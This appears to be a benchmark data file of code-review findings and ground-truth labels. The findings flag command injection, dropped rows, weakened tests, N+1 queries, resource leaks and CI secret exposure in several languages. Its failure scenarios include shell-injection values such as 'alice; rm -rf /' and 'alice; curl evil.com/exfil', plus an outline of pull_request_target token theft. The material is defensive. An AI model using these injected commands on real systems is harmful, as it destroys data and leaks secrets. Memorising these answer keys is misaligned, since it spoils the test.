findings.body: Importing dart:html ties this file to the Dart web platform. If client.dart is consumed by a Flutter non-web target or a server/VM entry point, compilation will fail because dart:html is unavailable outside the browser. The only new use of it is window.location.origin. If this library is not intentionally web-only, the origin should be injected or obtained from a platform-agnostic source instead.
findings.failure_scenario: A non-web consumer imports client.dart. The dart:html import causes a compile-time failure on that target, breaking the build for any platform other than the web.
findings.title: dart:html import restricts this library to web targets

findings.body: The second element of the returned record is `timeoutMs`, an input the caller already has. Returning it adds noise to the API and invites callers to depend on a value that can never differ from what they passed in. Dropping it also simplifies the return type from `(Map<String, Object?>, int)` to `Map<String, Object?>`.
findings.title: Don't return the timeoutMs the caller already supplied

findings.body: The `user` parameter is concatenated directly into a shell command string passed to `/bin/sh -c`. Any shell metacharacters in `user` (semicolons, pipes, backticks, `$()`, etc.) are interpreted by the shell, enabling arbitrary command execution. The previous ProcessBuilder approach passed arguments as an array without a shell, which was safe.
findings.failure_scenario: A caller passes `user = "alice; rm -rf /tmp"`. The shell executes `report --user alice; rm -rf /tmp`, running the injected command with the process's privileges.
findings.title: Restore ProcessBuilder to prevent shell command injection via `user`

findings.body: `rows.subList(1, rows.size())` returns elements from index 1 onward, silently dropping the first row — the opposite of the commit's "preserve report rows" intent. It also throws IndexOutOfBoundsException when `rows` is empty, because fromIndex (1) exceeds toIndex (0).
findings.failure_scenario: Calling render with an empty list throws IndexOutOfBoundsException; calling with a non-empty list returns a list missing its first element, so callers receive corrupted report data.
findings.title: Return rows unchanged; subList(1, size) drops the first row and crashes on empty input

findings.body: The assertion was weakened from `assertEquals(List.of("first", "second"), ...)` to `assertNotNull(...)`. A non-null check will pass even if the method returns the wrong subset.

findings.title: Restore an equality assertion that verifies the returned rows

findings.body: The previous implementation called repository.loadMany(ids) once; the new loop calls repository.load(id) per iteration, turning a single batched query into N round-trips. The cost now scales linearly with the size of ids, and on a large input this will dominate latency and pressure the connection pool. Use the batched loadMany and filter the results in memory.
findings.failure_scenario: When ids contains thousands of entries, enrich issues one database call per id, multiplying latency by N and risking connection-pool exhaustion under load.
findings.title: Batch repository lookups instead of loading one id at a time

findings.body: The original implementation returned all items from `repository.loadMany(ids)` without filtering. The new code silently drops items that are inactive, have a null owner, or have a disabled owner. This changes the method's return contract for every caller without explanation in the commit message. If any caller relies on receiving all loaded items, it will now receive a silently truncated list with no error signal.
findings.failure_scenario: A caller passes ids expecting all corresponding items back, but items that are inactive or have disabled/null owners are silently omitted from the result, causing the caller to process an incomplete dataset without any indication that items were dropped.
findings.title: New filtering silently changes enrich's return value semantics

findings.body: ResultListFactory.create() is a single-caller abstraction whose entire body is `return new ArrayList<>()`. It adds a class and an indirection for no benefit; the caller can construct the list directly. This is speculative generality with one caller and no configurability.
findings.title: Remove ResultListFactory — it only wraps new ArrayList<>()

The diff shows the entire file (lines 1–8) and the only import is `java.util.Date`. Without `import java.util.Map;` this file will not compile.
findings.failure_scenario: Compiling UserClient.java fails because `Map` is not in scope, blocking the entire build.
findings.title: Add import for java.util.Map to fix compilation error

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: Date.toGMTString() has been deprecated since JDK 1.1 because it uses a deprecated date format and is not locale/time-zone safe. The change reintroduces this legacy API on a freshly constructed Date, producing an RFC-822-ish GMT string whose format is not guaranteed across locales. Use the java.time formatters instead; the suggestion uses fully-qualified names so no new imports are required, or add imports for java.time.ZonedDateTime, java.time.ZoneOffset, and java.time.format.DateTimeFormatter.
findings.failure_scenario: A caller parsing the User's date string expects a stable format; toGMTString() emits a locale-dependent deprecated representation that can vary and that static analysis flags, breaking format contracts or failing lint gates.
findings.title: Replace deprecated Date.toGMTString() with java.time

findings.body: userId.trim() throws NullPointerException when userId is null. The previous implementation ignored userId entirely, so callers that passed null would not have crashed; this change introduces a new failure path. Add a null check so the method fails with a meaningful error rather than an unhandled NPE.

findings.body: The PreparedStatement is created but never closed, and the caller only receives the ResultSet. Per the JDBC specification, closing a ResultSet does not close its parent Statement, so each call leaks a database statement handle. Over time this can exhaust the connection pool's statement limit or the database cursor budget. Restructure the method to process results internally (e.g., with try-with-resources) or return a type that owns the statement lifecycle.
findings.failure_scenario: Repeated calls to find() accumulate unclosed PreparedStatement objects on the connection. Eventually the database or connection pool rejects new statements, causing application-wide failures or denial of service.
findings.title: Close PreparedStatement to avoid statement-handle leak

ground_truth.clean_trap: User-controlled text reaches a SQL operation only through PreparedStatement.setString, so it cannot alter query syntax.

findings.body: The commit message claims to "preserve FetchUser caller compatibility," but the signature changed from `func FetchUser(id string, timeout *time.Duration) User` to `func FetchUser(id string, timeout time.Duration) (User, time.Duration)`. The `timeout` parameter switched from pointer to value and the return type gained a second value, so every existing caller that passes a `*time.Duration` or assigns the single `User` return will fail to compile.

findings.failure_scenario: If defaults.json is missing or unreadable, the error is ignored and the function proceeds with no defaults applied, potentially returning a User with incomplete data without any indication of the failure.
findings.title: File read result and error are silently discarded

findings.body: Switching the trigger to `pull_request_target` makes the workflow run with the base branch's permissions and secrets. The workflow then checks out the PR head SHA (`github.event.pull_request.head.sha`) and runs `npm test`, executing attacker-controlled code with `RELEASE_TOKEN` exposed in the environment. This is the canonical `pull_request_target` secret-exfiltration pattern: a forked PR can modify `package.json` test scripts to read `RELEASE_TOKEN` and send it to an external endpoint. Revert to `pull_request`, which does not expose repository secrets to code from forked PRs. If secret access is genuinely required, do not run untrusted build/test steps under `pull_request_target`.
findings.failure_scenario: An attacker opens a PR from a fork that modifies the npm test script to read process.env.RELEASE_TOKEN and POST it to an attacker-controlled URL. Because pull_request_target grants secret access and the workflow checks out and executes the PR's code, the token is exfiltrated when CI runs.
findings.title: pull_request_target runs untrusted PR code with secret access

findings.body: `actions/labeler@v6` is pinned to a mutable version tag rather than an immutable commit SHA. This workflow uses `pull_request_target`, which executes with the repository's secrets and `pull-requests: write` permission. If the `v6` tag is moved to a malicious commit (e.g., through a compromised maintainer account or tag force-push), the workflow would run attacker-controlled code with access to those secrets and write permissions. Pinning to a full 40-character commit SHA prevents this supply-chain attack vector.
findings.failure_scenario: An attacker compromises the actions/labeler repository or forces the v6 tag to point at a malicious commit. The next PR workflow run pulls the malicious action, which executes with the repository's secrets and pull-request write token, allowing the attacker to exfiltrate secrets or modify repository state.
findings.title: Pin actions/labeler to a commit SHA, not a mutable tag

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1

findings.body: The previous list form avoided the shell entirely. Building a shell string from user_name and enabling shell=True lets user_name be interpreted as shell metacharacters, enabling command injection. The list form was simpler and safe — the string + shell=True path is needless complexity that introduces a vulnerability.
findings.failure_scenario: A caller passes user_name containing shell metacharacters (e.g. "; rm -rf ~"); because shell=True interpolates the value unquoted, the shell executes the injected command.
findings.title: Pass a list to subprocess.run instead of shell=True with an f-string

findings.body: Changing `return rows` to `return rows[1:]` discards the first element of the input without explanation. Callers that rely on the full list will receive incomplete data, and the accompanying test was weakened to hide the change.
findings.failure_scenario: A caller passes rows whose first element is meaningful (e.g. a header or the first data record); the function returns rows[1:], silently omitting it, so downstream consumers process incomplete data.
findings.title: Return all rows instead of silently dropping the first

findings.body: The assertion was weakened from an exact equality check to `is not None`, so it no longer verifies that the correct rows are returned or that the first row is preserved. This masks the rows[1:] behavior change and will not catch future regressions in the returned data.
findings.failure_scenario: A future change drops or reorders elements in the returned list; the test still passes because it only checks the result is not None, allowing the regression to ship undetected.
findings.title: Restore the assertion that checks the returned rows

findings.body: user_name is interpolated into a shell command string and executed with shell=True. Because user_name is not sanitized or quoted, any shell metacharacters in it are interpreted by the shell, allowing arbitrary command execution. The previous list-form invocation was safe because no shell was involved.
findings.failure_scenario: A caller passes user_name='; rm -rf /' (or any value containing shell operators). The f-string produces 'report --user ; rm -rf /', which subprocess.run executes through /bin/sh, running the injected command with the process's privileges.
findings.title: Use argument list instead of shell=True to prevent command injection

findings.body: The test was weakened from asserting the exact returned rows to only checking the result is not None. It no longer verifies that rows are preserved, so a regression in the return value (such as the new rows[1:] drop) passes silently.

findings.body: The previous implementation called repository.load_many(item_ids) once; the new loop calls repository.load(item_id) on every iteration, turning a single batched fetch into N round-trips. The cost scales linearly with the length of item_ids and will dominate latency for large inputs.
findings.failure_scenario: When item_ids contains many entries, each iteration issues a separate repository.load call (e.g. a database query or network request), increasing total latency proportionally and risking connection-pool exhaustion under load.
findings.suggestion:
return [
        item for item in repository.load_many(item_ids)
        if item.active and item.owner is not None and item.owner.enabled
    ]
findings.title: Batch the per-item repository loads

findings.body: The original code called repository.load_many(item_ids) once, fetching all items in a single batch. The new code calls repository.load(item_id) inside a loop, issuing one repository call per item. This is the classic N+1 pattern and contradicts the "efficiency" named in the commit message. If the filtering is the intended new behaviour, it can be applied to the batch result instead.
findings.failure_scenario: Calling enrich with N item_ids issues N repository.load calls instead of one load_many, increasing latency and repository load proportionally to the number of items.
findings.title: Batch load replaced with N+1 individual loads

findings.body: The change replaces `datetime.now(UTC)` (timezone-aware) with `datetime.utcnow()`, which is deprecated since Python 3.12 and returns a naive datetime. Callers that previously received a timezone-aware `fetched_at` may now break when comparing against aware datetimes or serializing to ISO 8601 with offset. The `UTC` import was also removed on line 1 and must be restored: `from datetime import UTC, datetime`.
findings.failure_scenario: A caller compares `payload["fetched_at"]` against another timezone-aware datetime (e.g. from `datetime.now(timezone.utc)`), raising `TypeError: can't compare offset-naive and offset-aware datetimes` at runtime.
findings.title: Restore timezone-aware timestamp instead of deprecated datetime.utcnow()

findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body: The commit message says 'keep fetch_user backward compatible', but the change removes the `timeout` default (callers that previously called `fetch_user(user_id)` now get a TypeError) and changes the return type from `dict` to `tuple[dict, int]` (callers expecting a dict now receive a tuple). Both are breaking changes that contradict the stated intent.
findings.failure_scenario: An existing caller invokes `fetch_user('123')` with no timeout. Under the old signature this worked; under the new signature Python raises TypeError: fetch_user() missing 1 required positional argument: 'timeout'. Callers that unpack the result as a dict also break because the return value is now a tuple.
findings.title: Restore the timeout default and docstring to keep fetch_user backward compatible

findings.body: Normalizing the input with `.toLowerCase()` only lowercases the query parameter, not the stored column value. If the `users.id` column holds mixed-case identifiers (or uses a case-sensitive collation), previously-matching lookups for IDs containing uppercase characters will now return no rows. The SQL `=` comparison remains case-sensitive, so this change silently makes existing users unfindable unless every stored ID is already lowercase.
findings.failure_scenario: A caller invokes findUser with an ID like "User123" that exists in the database. The new code lowercases it to "user123", the query compares against a stored "User123", the match fails, and the function returns an empty result for a user that exists.
findings.title: Lowercasing userId breaks lookups for case-sensitive IDs

ground_truth.clean_trap: Normalized user input still reaches SQL, but it remains a bound parameter rather than query text.

findings.body: Switching from spawnSync to execSync routes the command through a shell, and the template literal interpolates userName directly into that string. Any shell metacharacters in userName (e.g. "; rm -rf /" or "$(curl …)") are interpreted by the shell, giving an attacker arbitrary command execution. The original spawnSync form passed arguments as a separate array and was not vulnerable. To fix, import execFileSync (or revert to spawnSync) and pass arguments as an array so no shell parsing occurs.
findings.failure_scenario: A caller passes userName containing shell metacharacters such as 'alice; curl evil.com/exfil'. execSync runs the string through /bin/sh, which executes the injected command after the intended report call, leading to arbitrary code execution on the host.
findings.title: Use argument array, not interpolated shell string, to avoid command injection

findings.body: The function previously returned rows unchanged. The new rows.slice(1) returns a copy missing the first element, so callers receive one fewer row than they passed in. For an empty array, slice(1) returns an empty array rather than erroring, but the data loss is silent.
findings.failure_scenario: A caller passes ["first", "second"] expecting both back; renderReport returns ["second"], silently dropping the first row from the report output.
findings.title: rows.slice(1) drops the first row from the returned data

findings.body: The test was renamed from "preserves all rows" to "returns rows" and the assertion was weakened from toEqual(["first", "second"]) to toBeTruthy(). This no longer checks that the first row is present, so the rows.slice(1) regression in renderReport passes the test. The stated intent is to keep report output stable; a test that cannot detect row loss contradicts that intent.
findings.failure_scenario: renderReport drops the first row via rows.slice(1); the weakened test still passes because ["second"] is truthy, allowing the data-loss bug to merge undetected.
findings.title: Test no longer verifies that all rows are preserved

ground_truth.commit_message: feat: keep report output stable for named users

findings.body: repository.load(id) can return null or undefined when an id does not exist. Accessing item.active on such a result throws a TypeError, crashing the entire enrich call and returning no results for any id — including valid ones already processed before the throw.
findings.failure_scenario: When repository.load(id) returns null or undefined for a non-existent id, accessing item.active throws a TypeError, crashing the entire enrich call and returning no results for any id.
findings.title: Guard against null/undefined items returned by repository.load

findings.body: The previous implementation called repository.loadMany(ids) once; the new loop issues repository.load(id) on every iteration, turning one batched query into N round-trips. The cost scales linearly with the size of ids.
findings.failure_scenario: When ids contains many entries, each id triggers a separate repository.load call, multiplying database round-trips and increasing latency proportionally to input size, potentially exhausting the connection pool.
findings.suggestion:
const items = await repository.loadMany(ids);
  return items.filter(item => item.active && item.owner && item.owner.enabled);
findings.title: Batch the per-id repository loads

findings.body: ResultArrayFactory.create() wraps `return []` in a class with a single static method and no callers besides this one. The abstraction adds indirection with no benefit; a literal `[]` is clearer and shorter, and the entire class (lines 1–4) can be deleted.
findings.title: Replace ResultArrayFactory with a literal array

findings.body: Switching from direct argument passing to `sh -c` with a `format!`-interpolated string introduces a command-injection vector: any shell metacharacters or command separators in `user` are interpreted by the shell. The previous form passed `user` as a single argv element, which was safe. This is also needless complexity — the standard library already handles argument splitting correctly.
findings.failure_scenario: A caller passes a `user` value containing `; rm -rf /` or `$(...)`. The shell spawned by `sh -c` executes the injected command, leading to arbitrary command execution with the process's privileges.
findings.title: Restore direct argv passing to avoid shell injection

findings.body: `rows.into_iter().skip(1).collect()` silently discards the first element of the input vector. If the caller passes a single-row vector the result is empty, and the function name `render_report` gives no indication that data will be dropped.
findings.failure_scenario: A caller passes `vec!["only_row"]`; `skip(1)` yields an empty iterator and the function returns an empty vector, silently losing the only row.
findings.title: Preserve all input rows instead of skipping the first

findings.body: The assertion was downgraded from exact equality (`vec!["first", "second"]`) to `!is_empty()`. This cannot detect that `render_report` now discards the first row via `skip(1)`, so the behavior change ships untested. The rename from `preserves_rows` to `returns_rows` further obscures the weakened contract.
findings.title: Restore exact assertion to catch row-dropping regressions

findings.body: The spec requires report commands to pass user names as arguments without a shell. The new code interpolates `user` into a string and runs it via `sh -c`, so a value like `alice; rm -rf /` is executed as shell input. This both violates the explicit requirement and introduces a command-injection vulnerability that the previous `Command::new("report").args(["--user", user])` form avoided.
findings.failure_scenario: A caller passes a user name containing shell metacharacters (e.g. `alice; touch pwned`). `format!` embeds it verbatim, `sh -c` parses and runs the injected command with the process's privileges, leading to arbitrary command execution.
findings.title: Pass user through a shell, contradicting the spec and enabling injection

findings.body: The original code called repo.load_many(ids) once; the rewrite issues repo.load(*id) inside the loop, turning a single batched fetch into one repository call per id. The cost scales linearly with the length of ids and dominates latency as the input grows.

findings.body: `std::mem::uninitialized()` has been deprecated since Rust 1.39.0 because it is unsound. Creating an uninitialized `UserRecord` is undefined behavior if `UserRecord` contains any type whose bit patterns are not all valid (e.g. `bool`, `char`, enums, references, `NonZero*`). Passing `scratch` to `UserRecord::merge` reads that uninitialized memory, which is UB regardless of the type's validity invariant. The previous code safely constructed a valid record via `UserRecord::new`; this change replaces that with `unsafe` UB.
findings.failure_scenario: Calling fetch_user creates a UserRecord with arbitrary bit patterns. If UserRecord contains a bool, char, enum, reference, or NonZero type, the invalid bits are undefined behavior, which can corrupt memory, crash the process, or produce unpredictable results inside merge and any downstream code that touches the returned record.
findings.title: std::mem::uninitialized is deprecated and causes undefined behavior

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message says "keep fetch_user source compatible", but the signature changed in two breaking ways: `timeout_ms` went from `Option<u64>` to `u64`, and the return type went from `UserRecord` to `(UserRecord, u64)`. Existing callers passing `None` or a bare `Some(ms)` will fail to compile, and callers using the returned `UserRecord` directly will break on the tuple. This contradicts the stated intent rather than fulfilling it.
findings.failure_scenario: A caller written against the old signature passes `fetch_user(id, None)` or treats the return as `UserRecord`; after this change it no longer compiles, despite the commit claiming source compatibility.
findings.title: Signature change breaks source compatibility promised by the commit

findings.body: The new code builds a shell command string by interpolating `user` directly into `command` and runs it through `sh -c`. Any shell metacharacters in `user` (e.g. `alice; rm -rf /`) are executed by the shell, leading to arbitrary command execution. The previous code passed `user` as a separate argv element to `report`, which was safe.
findings.failure_scenario: A caller passes a user value containing shell metacharacters (e.g. `alice; touch /tmp/pwned`). `sh -c` parses and executes the injected command, running arbitrary code with the process's privileges.
findings.title: Command injection via shell interpolation of user input

findings.body: The commit message says "preserve report rows for named users," but `rows.sublist(1)` discards the first row. The previous code returned all rows unchanged. This contradicts the stated intent and silently loses data.
findings.failure_scenario: A caller passes `['first', 'second']` expecting all rows back. `sublist(1)` returns `['second']`, dropping 'first' — the first report row is silently lost.
findings.title: Return all rows instead of dropping the first

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was changed from asserting the exact returned rows (`['first', 'second']`) to merely asserting `isNotNull`. This removes the verification that rows are preserved, which is the behavior the commit message claims to implement.
findings.title: Restore the test that verifies rows are preserved

findings.body: `Process.run('sh', ['-c', command])` invokes a shell on the interpolated `command` string, enabling command injection. Remove the shell layer and pass arguments directly to the `report` executable.
findings.failure_scenario: A user value such as `alice; rm -rf /` causes `sh -c` to run `report --user alice; rm -rf /`, executing the second command with the process's privileges.
findings.title: Pass user as an argument, not through a shell string

findings.body: The previous implementation called repository.loadMany(ids) once for the whole batch. The new code awaits repository.load(id) inside a loop, issuing one repository round-trip per id. Cost now scales linearly with the number of ids, turning a single batched call into N calls.
findings.failure_scenario: When ids contains many entries, enrich issues one repository.load per id sequentially, multiplying latency by N and increasing load on the backing store or connection pool compared to the prior batched loadMany call.
findings.title: Batch the per-id loads instead of awaiting repository.load in a loop

findings.body: The original implementation returned every item that loadMany produced for the given ids. The new code only adds items where item.active is true, item.owner is non-null, and item.owner!.enabled is true. Any caller that relied on enrich returning all items for the supplied ids will now receive a subset with no indication that items were dropped. This changes the function's return contract from "load all" to "load and filter," which is not reflected in the function name or signature.
findings.failure_scenario: A caller passes ids [a, b, c] expecting items [a, b, c] back. Item b is inactive. The caller receives [a, c] and, because the return type is still List<Item> with no error, treats the missing item as successfully processed — leading to silent data omission downstream.
findings.title: enrich now silently filters out inactive and ownerless items

findings.body: ResultListFactory is a class with a single static method that only returns <Item>[], and it has exactly one caller. This is speculative scaffolding that adds indirection with no benefit; the list literal is clearer at the call site.
findings.title: Remove ResultListFactory; inline the list literal

findings.body: The new code builds a shell command string by concatenating `user` directly into `/bin/sh -c "report --user " + user`. A caller-controlled `user` value containing shell metacharacters (e.g. `alice; rm -rf /`) is interpreted by /bin/sh, allowing arbitrary command execution. The previous ProcessBuilder form passed `user` as a separate argv element and was not vulnerable.
findings.failure_scenario: A caller passes `user = "alice; touch /tmp/pwned"`; /bin/sh -c parses the semicolon and executes `touch /tmp/pwned` after the intended report command, running arbitrary commands as the service process.
findings.title: Command injection via shell concatenation of user input

findings.body: Returning `rows.subList(1, rows.size())` removes the first element of `rows` and, when `rows` is empty, throws IndexOutOfBoundsException because fromIndex (1) exceeds toIndex (0). The previous implementation returned `rows` unchanged. This contradicts the commit message "preserve report rows for named users" by discarding a row and by crashing on empty input.
findings.failure_scenario: A caller invokes render with `rows = List.of()`; `rows.subList(1, 0)` throws IndexOutOfBoundsException, and the method never returns. With a non-empty list the first row is silently dropped from the returned report.
findings.title: subList(1, size) drops the first row and throws on empty input

findings.body: The test was renamed to `returnsRows` and downgraded from `assertEquals(List.of("first", "second"), ...)` to `assertNotNull(...)`. The commit message claims to "preserve report rows for named users", but the new assertion only checks that something non-null is returned and would pass even if rows are dropped or reordered, so it no longer verifies the stated intent.
findings.failure_scenario: The implementation drops the first row (as the current subList change does) yet the test still passes because it only asserts non-nullity, letting a row-preserving regression ship undetected.
findings.title: Restore an equality assertion that verifies row preservation

findings.body: The new enrich() calls repository.load(id) once per id inside a loop, replacing the previous batched repository.loadMany(ids) call. This is an N+1 query pattern: the number of repository round-trips scales linearly with the size of the ids list. If repository.load hits a database or remote service per call, a large ids list will multiply latency and connection-pool pressure proportionally, where a single batched fetch would issue one round-trip.
findings.failure_scenario: A caller passes a list of 10,000 ids. enrich() issues 10,000 sequential repository.load calls instead of one batched fetch, increasing wall-clock latency by orders of magnitude and risking connection-pool exhaustion under concurrent callers.
findings.title: Batch the per-id repository loads

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The PreparedStatement is created locally and never closed. Each call to find() leaks an open statement on the connection, which can exhaust the database cursor or statement pool over time. A try-with-resources fix is not straightforward here because closing the statement would also close the ResultSet in most JDBC drivers before the caller can read it — the method should either return a mapped domain object instead of a raw ResultSet, or process the results internally and close the statement before returning.
findings.failure_scenario: Repeated calls to find() accumulate open PreparedStatements on the connection, eventually exhausting the database statement/cursor pool and causing subsequent queries to fail with a resource-limit error.
findings.title: Close the PreparedStatement to avoid leaking database resources

findings.body: Concatenating `user` into a `sh -c` command string lets any shell metacharacters in `user` execute as arbitrary commands. The previous code passed `user` as a discrete argument to `exec.Command`, which the OS exec layer delivers verbatim without shell interpretation. This change reintroduces a command-injection vector on an input whose value is not shown to be constrained here.
findings.failure_scenario: A caller passes a user value containing shell syntax such as `alice; rm -rf /tmp/x`. `sh -c` interprets the semicolon and runs the injected command after `report`, executing attacker-controlled code with the process's privileges.
findings.title: Pass user as an argument, not through a shell string

findings.body: `rows[1:]` drops the first element of the input, so callers receive one fewer row than they passed in — the opposite of the commit's stated intent to "preserve report rows." It also panics on an empty slice: `rows[1:]` evaluates to `rows[1:0]`, which is out of range in Go. A single-element slice silently becomes empty.
findings.failure_scenario: Render is called with `[]string{"first", "second"}`; the caller receives `["second"]` and the first row is lost. Called with an empty `[]string{}`, `rows[1:]` panics with slice bounds out of range, crashing the program.
findings.title: Return rows instead of rows[1:] to preserve all rows

findings.body: The replacement test only asserts the result is non-nil. It no longer verifies the row count or that the expected rows are present, so a regression in the slicing logic (e.g., returning all rows, dropping the wrong row, or returning an empty slice) would pass silently. The previous test checked `len(got) == 2` and `got[0] == "first"`; the new behaviour drops the first row, so the test should assert that.
findings.title: Strengthen TestRenderReturnsRows to verify row content
